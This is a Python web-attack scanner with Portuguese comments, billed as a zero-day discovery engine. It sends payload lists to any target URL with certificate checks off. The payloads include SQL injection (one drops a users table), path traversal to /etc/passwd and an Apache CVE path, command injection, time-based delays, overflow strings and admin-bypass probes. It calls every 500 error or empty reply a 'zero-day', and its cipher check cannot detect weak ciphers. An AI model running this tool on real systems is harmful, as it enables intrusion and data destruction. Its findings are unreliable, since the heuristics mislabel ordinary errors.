#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🕳️ ZERO-DAY DISCOVERY ENGINE 🕳️
Sistema avançado de descoberta automática de vulnerabilidades zero-day
Usa análise comportamental, fuzzing inteligente e machine learning

⚠️  ATENÇÃO: USE APENAS EM AMBIENTES AUTORIZADOS ⚠️
"""

import requests
import time
import random
import hashlib
import threading
import json
import re
import base64
import struct
import socket
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor
import numpy as np
from urllib.parse import urlparse, urljoin, quote, unquote
import subprocess
import difflib

@dataclass
class ZeroDaySignature:
    """Assinatura de possível zero-day"""
    vulnerability_type: str
    confidence_score: float
    target_service: str
    payload_used: str
    response_anomaly: str
    exploitation_vector: str
    evidence: Dict[str, Any]
    risk_level: str
    discovery_method: str
    
@dataclass
class BehavioralAnomaly:
    """Anomalia comportamental detectada"""
    anomaly_type: str
    baseline_response: str
    anomalous_response: str
    response_time_delta: float
    status_code_anomaly: bool
    content_length_anomaly: bool
    header_anomalies: List[str]
    error_patterns: List[str]

class ZeroDayDiscoveryEngine:
    """
    🕳️ Engine de descoberta de zero-days
    
    Técnicas implementadas:
    - Análise de anomalias comportamentais
    - Fuzzing inteligente e adaptativo
    - Detecção de padrões de erro únicos
    - Análise de timing attacks
    - Buffer overflow detection
    - Logic flaw discovery
    - Cryptographic weakness detection
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 30
        
        # Base de conhecimento de padrões normais
        self.baseline_responses = {}
        self.known_error_patterns = set()
        self.timing_baselines = {}
        
        # Payloads para fuzzing adaptativo
        self.adaptive_payloads = {
            "buffer_overflow": [
                "A" * 100, "A" * 500, "A" * 1000, "A" * 5000, "A" * 10000,
                "\x41" * 100 + "\x00" * 10, "\x90" * 100 + "\x41" * 100,
                "%s" * 100, "%x" * 100, "%n" * 50
            ],
            "format_string": [
                "%s%s%s%s", "%x%x%x%x", "%n%n%n%n", "%08x" * 10,
                "%s" * 50, "%x" * 50, "%d" * 50, "%c" * 50
            ],
            "injection_vectors": [
                "'; DROP TABLE users; --", "' OR '1'='1", "\" OR \"1\"=\"1",
                "${7*7}", "{{7*7}}", "<%=7*7%>", "#{'7'*7}",
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            "null_bytes": [
                "\x00", "\x00\x00", "test\x00.txt", "file.php\x00.jpg",
                "%00", "%00%00", "test%00.exe"
            ],
            "unicode_bypass": [
                "\u0000", "\u00A0", "\u2028", "\u2029", "\uFEFF",
                "\u202E", "\u200B", "\u200C", "\u200D"
            ],
            "cryptographic": [
                "padding_oracle_test", "bit_flipping_test", "timing_attack_vector",
                "weak_randomness_probe", "hash_length_extension"
            ]
        }
        
        # Padrões de erro que indicam possíveis vulnerabilidades
        self.vulnerability_indicators = {
            "buffer_overflow": [
                r"segmentation fault", r"access violation", r"stack overflow",
                r"heap corruption", r"buffer overrun", r"memory corruption"
            ],
            "sql_injection": [
                r"mysql_fetch_array", r"ORA-\d+", r"Microsoft.*ODBC.*SQL",
                r"PostgreSQL.*ERROR", r"sqlite3\.OperationalError"
            ],
            "path_traversal": [
                r"root:x:0:0:", r"\[boot loader\]", r"The system cannot find the path",
                r"No such file or directory", r"Permission denied"
            ],
            "code_injection": [
                r"Parse error", r"Fatal error", r"Warning.*include",
                r"eval\(\)", r"system\(\)", r"exec\(\)"
            ],
            "deserialization": [
                r"ObjectInputStream", r"unserialize", r"pickle\.loads",
                r"json\.loads", r"yaml\.load"
            ]
        }
        
        # Detecção de serviços e versões para exploits targeted
        self.service_fingerprints = {
            "apache": {
                "version_headers": ["Server: Apache"],
                "known_vulns": ["CVE-2021-41773", "CVE-2021-42013"],
                "test_paths": ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"]
            },
            "nginx": {
                "version_headers": ["Server: nginx"],
                "known_vulns": ["CVE-2013-2028", "CVE-2017-7529"],
                "test_paths": ["/.. /etc/passwd", "/../etc/passwd"]
            },
            "iis": {
                "version_headers": ["Server: Microsoft-IIS"],
                "known_vulns": ["CVE-2017-7269", "CVE-2021-31166"],
                "test_paths": ["/aspnet_client/", "/*.asp"]
            }
        }

    def discover_zero_days(self, target_url: str, deep_scan: bool = True) -> List[ZeroDaySignature]:
        """
        🕳️ Descoberta principal de zero-days
        """
        if self.logger:
            self.logger.warning(f"🕳️ INICIANDO DESCOBERTA DE ZERO-DAYS em {target_url}")
        
        zero_days = []
        
        # 1. Estabelecer baseline comportamental
        baseline = self._establish_baseline(target_url)
        
        # 2. Fuzzing adaptativo
        fuzz_results = self._adaptive_fuzzing(target_url, baseline)
        zero_days.extend(fuzz_results)
        
        # 3. Análise de timing attacks
        timing_vulns = self._timing_attack_analysis(target_url)
        zero_days.extend(timing_vulns)
        
        # 4. Detecção de buffer overflows
        buffer_vulns = self._buffer_overflow_detection(target_url)
        zero_days.extend(buffer_vulns)
        
        # 5. Logic flaw discovery
        logic_vulns = self._logic_flaw_discovery(target_url)
        zero_days.extend(logic_vulns)
        
        if deep_scan:
            # 6. Cryptographic weakness detection
            crypto_vulns = self._cryptographic_analysis(target_url)
            zero_days.extend(crypto_vulns)
            
            # 7. Memory corruption detection
            memory_vulns = self._memory_corruption_analysis(target_url)
            zero_days.extend(memory_vulns)
        
        # Filtrar e ranquear por confiança
        filtered_zero_days = [zd for zd in zero_days if zd.confidence_score > 0.7]
        
        if self.logger:
            self.logger.critical(f"🕳️ DESCOBERTOS {len(filtered_zero_days)} POSSÍVEIS ZERO-DAYS!")
        
        return sorted(filtered_zero_days, key=lambda x: x.confidence_score, reverse=True)

    def _establish_baseline(self, target_url: str) -> Dict[str, Any]:
        """Estabelece baseline comportamental do alvo"""
        baseline = {
            "normal_responses": {},
            "timing_patterns": {},
            "error_responses": {},
            "service_fingerprint": {}
        }
        
        # Requests normais para estabelecer padrão
        normal_requests = [
            "/", "/index.html", "/robots.txt", "/sitemap.xml",
            "/favicon.ico", "/css/style.css", "/js/script.js"
        ]
        
        for path in normal_requests:
            try:
                start_time = time.time()
                response = self.session.get(urljoin(target_url, path))
                end_time = time.time()
                
                baseline["normal_responses"][path] = {
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "headers": dict(response.headers),
                    "response_time": end_time - start_time
                }
                
                # Fingerprint do serviço
                if "Server" in response.headers:
                    baseline["service_fingerprint"]["server"] = response.headers["Server"]
                
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro no baseline para {path}: {e}")
        
        return baseline

    def _adaptive_fuzzing(self, target_url: str, baseline: Dict) -> List[ZeroDaySignature]:
        """Fuzzing adaptativo baseado no comportamento baseline"""
        zero_days = []
        
        # Testar diferentes categorias de payloads
        for category, payloads in self.adaptive_payloads.items():
            for payload in payloads:
                try:
                    # Testar em diferentes contextos
                    test_contexts = [
                        f"/?q={quote(payload)}",
                        f"/search?query={quote(payload)}",
                        f"/api/test?param={quote(payload)}",
                        f"/admin?user={quote(payload)}"
                    ]
                    
                    for context in test_contexts:
                        anomaly = self._detect_behavioral_anomaly(
                            urljoin(target_url, context), 
                            baseline, 
                            payload, 
                            category
                        )
                        
                        if anomaly and self._is_potential_zero_day(anomaly, category):
                            zero_day = ZeroDaySignature(
                                vulnerability_type=f"Zero-day {category}",
                                confidence_score=self._calculate_confidence(anomaly),
                                target_service=baseline.get("service_fingerprint", {}).get("server", "Unknown"),
                                payload_used=payload,
                                response_anomaly=anomaly.anomaly_type,
                                exploitation_vector=context,
                                evidence={
                                    "baseline_response": anomaly.baseline_response[:500],
                                    "anomalous_response": anomaly.anomalous_response[:500],
                                    "timing_delta": anomaly.response_time_delta,
                                    "error_patterns": anomaly.error_patterns
                                },
                                risk_level=self._assess_risk_level(anomaly),
                                discovery_method="adaptive_fuzzing"
                            )
                            zero_days.append(zero_day)
                            
                            if self.logger:
                                self.logger.warning(f"🕳️ POSSÍVEL ZERO-DAY: {category} - Confiança: {zero_day.confidence_score:.2f}")
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"Erro no fuzzing adaptativo: {e}")
        
        return zero_days

    def _detect_behavioral_anomaly(self, test_url: str, baseline: Dict, payload: str, category: str) -> Optional[BehavioralAnomaly]:
        """Detecta anomalias comportamentais na resposta"""
        try:
            start_time = time.time()
            response = self.session.get(test_url)
            end_time = time.time()
            
            # Comparar com baseline
            baseline_response = baseline["normal_responses"].get("/", {})
            
            # Detectar anomalias
            anomalies = []
            
            # 1. Anomalia de status code
            status_anomaly = response.status_code not in [200, 404] and response.status_code != baseline_response.get("status_code")
            
            # 2. Anomalia de tempo de resposta
            baseline_time = baseline_response.get("response_time", 1.0)
            current_time = end_time - start_time
            timing_anomaly = abs(current_time - baseline_time) > baseline_time * 2
            
            # 3. Anomalia de tamanho de conteúdo
            baseline_length = baseline_response.get("content_length", 0)
            current_length = len(response.content)
            length_anomaly = abs(current_length - baseline_length) > baseline_length * 0.5
            
            # 4. Padrões de erro específicos
            error_patterns = []
            response_text = response.text.lower()
            
            for vuln_type, patterns in self.vulnerability_indicators.items():
                for pattern in patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        error_patterns.append(f"{vuln_type}: {pattern}")
            
            # 5. Padrões de debug/stack trace
            debug_patterns = [
                r"stack trace", r"debug info", r"exception", r"error.*line \d+",
                r"warning.*function", r"fatal error", r"parse error"
            ]
            
            for pattern in debug_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    error_patterns.append(f"debug_info: {pattern}")
            
            # Se encontrou anomalias significativas
            if status_anomaly or timing_anomaly or length_anomaly or error_patterns:
                return BehavioralAnomaly(
                    anomaly_type=f"behavioral_anomaly_{category}",
                    baseline_response=baseline_response.get("content", "")[:1000],
                    anomalous_response=response.text[:1000],
                    response_time_delta=current_time - baseline_time,
                    status_code_anomaly=status_anomaly,
                    content_length_anomaly=length_anomaly,
                    header_anomalies=[],
                    error_patterns=error_patterns
                )
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Erro na detecção de anomalia: {e}")
        
        return None

    def _timing_attack_analysis(self, target_url: str) -> List[ZeroDaySignature]:
        """Análise de timing attacks para descobrir vulnerabilidades"""
        zero_days = []
        
        # Payloads que podem causar delays
        timing_payloads = [
            "sleep(5)", "WAITFOR DELAY '00:00:05'", "pg_sleep(5)",
            "benchmark(50000000,md5(1))", "heavy_computation_payload",
            "../../../dev/random", "||ping -c 10 127.0.0.1||"
        ]
        
        for payload in timing_payloads:
            try:
                # Medir tempo baseline
                baseline_times = []
                for _ in range(3):
                    start = time.time()
                    self.session.get(target_url)
                    baseline_times.append(time.time() - start)
                
                avg_baseline = sum(baseline_times) / len(baseline_times)
                
                # Testar payload com timing
                start = time.time()
                test_url = f"{target_url}?test={quote(payload)}"
                response = self.session.get(test_url)
                payload_time = time.time() - start
                
                # Se houve delay significativo (> 3 segundos de diferença)
                if payload_time - avg_baseline > 3.0:
                    zero_day = ZeroDaySignature(
                        vulnerability_type="Timing-based Zero-day",
                        confidence_score=min(0.9, 0.5 + (payload_time - avg_baseline) / 10),
                        target_service="Web Application",
                        payload_used=payload,
                        response_anomaly=f"Timing delay: {payload_time - avg_baseline:.2f}s",
                        exploitation_vector="timing_attack",
                        evidence={
                            "baseline_time": avg_baseline,
                            "payload_time": payload_time,
                            "delay_delta": payload_time - avg_baseline
                        },
                        risk_level="HIGH",
                        discovery_method="timing_analysis"
                    )
                    zero_days.append(zero_day)
                    
                    if self.logger:
                        self.logger.warning(f"🕰️ TIMING ATTACK DETECTADO: Delay de {payload_time - avg_baseline:.2f}s")
            
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro na análise de timing: {e}")
        
        return zero_days

    def _buffer_overflow_detection(self, target_url: str) -> List[ZeroDaySignature]:
        """Detecta possíveis buffer overflows"""
        zero_days = []
        
        # Payloads progressivos para buffer overflow
        buffer_sizes = [100, 500, 1000, 5000, 10000, 50000]
        
        for size in buffer_sizes:
            payload = "A" * size
            try:
                response = self.session.get(f"{target_url}?data={payload}")
                
                # Indicadores de buffer overflow
                overflow_indicators = [
                    response.status_code == 500,
                    "internal server error" in response.text.lower(),
                    "segmentation fault" in response.text.lower(),
                    "access violation" in response.text.lower(),
                    "stack overflow" in response.text.lower(),
                    len(response.content) == 0 and response.status_code == 200
                ]
                
                if any(overflow_indicators):
                    zero_day = ZeroDaySignature(
                        vulnerability_type="Buffer Overflow Zero-day",
                        confidence_score=0.8,
                        target_service="Web Application",
                        payload_used=f"Buffer size: {size}",
                        response_anomaly="Buffer overflow indicators detected",
                        exploitation_vector="buffer_overflow",
                        evidence={
                            "buffer_size": size,
                            "status_code": response.status_code,
                            "response_length": len(response.content),
                            "indicators": [ind for ind in overflow_indicators if ind]
                        },
                        risk_level="CRITICAL",
                        discovery_method="buffer_overflow_detection"
                    )
                    zero_days.append(zero_day)
                    
                    if self.logger:
                        self.logger.critical(f"💥 BUFFER OVERFLOW DETECTADO: Tamanho {size}")
                    break  # Parar no primeiro overflow detectado
            
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro na detecção de buffer overflow: {e}")
        
        return zero_days

    def _logic_flaw_discovery(self, target_url: str) -> List[ZeroDaySignature]:
        """Descobre falhas lógicas na aplicação"""
        zero_days = []
        
        # Testes de lógica de negócio
        logic_tests = [
            # Bypass de autenticação
            {"path": "/admin", "method": "GET", "headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"path": "/admin", "method": "GET", "headers": {"X-Real-IP": "localhost"}},
            {"path": "/api/admin", "method": "OPTIONS"},
            
            # Price manipulation
            {"path": "/checkout", "method": "POST", "data": {"price": "-100"}},
            {"path": "/api/cart", "method": "PUT", "data": {"quantity": "-5"}},
            
            # IDOR tests
            {"path": "/user/1", "method": "GET"},
            {"path": "/user/999999", "method": "GET"},
            {"path": "/api/user/0", "method": "GET"},
        ]
        
        for test in logic_tests:
            try:
                if test["method"] == "GET":
                    response = self.session.get(
                        urljoin(target_url, test["path"]),
                        headers=test.get("headers", {})
                    )
                elif test["method"] == "POST":
                    response = self.session.post(
                        urljoin(target_url, test["path"]),
                        data=test.get("data", {}),
                        headers=test.get("headers", {})
                    )
                elif test["method"] == "OPTIONS":
                    response = self.session.options(
                        urljoin(target_url, test["path"]),
                        headers=test.get("headers", {})
                    )
                
                # Análise de respostas suspeitas
                suspicious_indicators = [
                    response.status_code == 200 and "admin" in test["path"],
                    "password" in response.text.lower() and response.status_code == 200,
                    "unauthorized" not in response.text.lower() and "admin" in test["path"],
                    response.status_code == 200 and "user" in test["path"] and len(response.content) > 100
                ]
                
                if any(suspicious_indicators):
                    zero_day = ZeroDaySignature(
                        vulnerability_type="Logic Flaw Zero-day",
                        confidence_score=0.7,
                        target_service="Web Application",
                        payload_used=str(test),
                        response_anomaly="Logic bypass detected",
                        exploitation_vector="logic_flaw",
                        evidence={
                            "test_case": test,
                            "status_code": response.status_code,
                            "response_preview": response.text[:500],
                            "indicators": suspicious_indicators
                        },
                        risk_level="HIGH",
                        discovery_method="logic_flaw_discovery"
                    )
                    zero_days.append(zero_day)
                    
                    if self.logger:
                        self.logger.warning(f"🧠 FALHA LÓGICA DETECTADA: {test['path']}")
            
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro na descoberta de falha lógica: {e}")
        
        return zero_days

    def _cryptographic_analysis(self, target_url: str) -> List[ZeroDaySignature]:
        """Análise de fraquezas criptográficas"""
        zero_days = []
        
        try:
            # Análise SSL/TLS
            parsed_url = urlparse(target_url)
            if parsed_url.scheme == "https":
                # Testar weak ciphers
                weak_ciphers = self._test_weak_ciphers(parsed_url.hostname, parsed_url.port or 443)
                if weak_ciphers:
                    zero_day = ZeroDaySignature(
                        vulnerability_type="Cryptographic Weakness",
                        confidence_score=0.8,
                        target_service="TLS/SSL",
                        payload_used="weak_cipher_test",
                        response_anomaly="Weak cryptographic implementation",
                        exploitation_vector="crypto_weakness",
                        evidence={"weak_ciphers": weak_ciphers},
                        risk_level="MEDIUM",
                        discovery_method="cryptographic_analysis"
                    )
                    zero_days.append(zero_day)
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Erro na análise criptográfica: {e}")
        
        return zero_days

    def _memory_corruption_analysis(self, target_url: str) -> List[ZeroDaySignature]:
        """Análise de corrupção de memória"""
        zero_days = []
        
        # Payloads para detectar corrupção de memória
        memory_payloads = [
            "\x90" * 1000 + "\x41" * 100,  # NOP sled + overflow
            "%s" * 100 + "%n" * 10,        # Format string
            "\x00" * 1000,                 # Null bytes
            "\xFF" * 1000,                 # High bytes
            "A" * 1000 + "\x00" * 100      # Mixed pattern
        ]
        
        for payload in memory_payloads:
            try:
                # Enviar payload encoded
                encoded_payload = base64.b64encode(payload.encode('latin-1')).decode()
                response = self.session.get(f"{target_url}?data={encoded_payload}")
                
                # Indicadores de corrupção de memória
                corruption_indicators = [
                    response.status_code >= 500,
                    "segmentation" in response.text.lower(),
                    "memory" in response.text.lower(),
                    "corruption" in response.text.lower(),
                    "heap" in response.text.lower(),
                    len(response.content) == 0 and response.status_code == 200
                ]
                
                if any(corruption_indicators):
                    zero_day = ZeroDaySignature(
                        vulnerability_type="Memory Corruption Zero-day",
                        confidence_score=0.9,
                        target_service="Native Application",
                        payload_used="memory_corruption_pattern",
                        response_anomaly="Memory corruption detected",
                        exploitation_vector="memory_corruption",
                        evidence={
                            "payload_type": "memory_corruption",
                            "status_code": response.status_code,
                            "indicators": corruption_indicators
                        },
                        risk_level="CRITICAL",
                        discovery_method="memory_corruption_analysis"
                    )
                    zero_days.append(zero_day)
                    
                    if self.logger:
                        self.logger.critical(f"💀 CORRUPÇÃO DE MEMÓRIA DETECTADA!")
            
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro na análise de corrupção de memória: {e}")
        
        return zero_days

    def _test_weak_ciphers(self, hostname: str, port: int) -> List[str]:
        """Testa ciphers fracos no SSL/TLS"""
        weak_ciphers = []
        try:
            # Esta seria uma implementação mais complexa usando OpenSSL
            # Por agora, retornamos uma lista simulada
            import ssl
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    if cipher and len(cipher) > 0:
                        # Verificar se é cipher fraco
                        weak_patterns = ['RC4', 'DES', 'MD5', 'NULL']
                        cipher_name = cipher[0]
                        for pattern in weak_patterns:
                            if pattern in cipher_name:
                                weak_ciphers.append(cipher_name)
        except Exception:
            pass
        
        return weak_ciphers

    def _is_potential_zero_day(self, anomaly: BehavioralAnomaly, category: str) -> bool:
        """Determina se a anomalia indica um possível zero-day"""
        # Critérios para classificar como possível zero-day
        criteria_met = 0
        
        # 1. Padrões de erro únicos
        if anomaly.error_patterns:
            criteria_met += 2
        
        # 2. Anomalia de timing significativa
        if abs(anomaly.response_time_delta) > 2.0:
            criteria_met += 1
        
        # 3. Mudança drástica no tamanho da resposta
        if anomaly.content_length_anomaly:
            criteria_met += 1
        
        # 4. Status codes anômalos
        if anomaly.status_code_anomaly:
            criteria_met += 1
        
        # Considerar zero-day se pelo menos 2 critérios forem atendidos
        return criteria_met >= 2

    def _calculate_confidence(self, anomaly: BehavioralAnomaly) -> float:
        """Calcula score de confiança para a descoberta"""
        confidence = 0.5  # Base
        
        # Incrementar baseado em evidências
        if anomaly.error_patterns:
            confidence += 0.2 * len(anomaly.error_patterns)
        
        if abs(anomaly.response_time_delta) > 5.0:
            confidence += 0.3
        
        if anomaly.status_code_anomaly:
            confidence += 0.1
        
        if anomaly.content_length_anomaly:
            confidence += 0.1
        
        return min(1.0, confidence)

    def _assess_risk_level(self, anomaly: BehavioralAnomaly) -> str:
        """Avalia nível de risco da descoberta"""
        score = 0
        
        if anomaly.error_patterns:
            score += len(anomaly.error_patterns) * 2
        
        if abs(anomaly.response_time_delta) > 5.0:
            score += 3
        
        if anomaly.status_code_anomaly:
            score += 1
        
        if score >= 5:
            return "CRITICAL"
        elif score >= 3:
            return "HIGH"
        elif score >= 1:
            return "MEDIUM"
        else:
            return "LOW"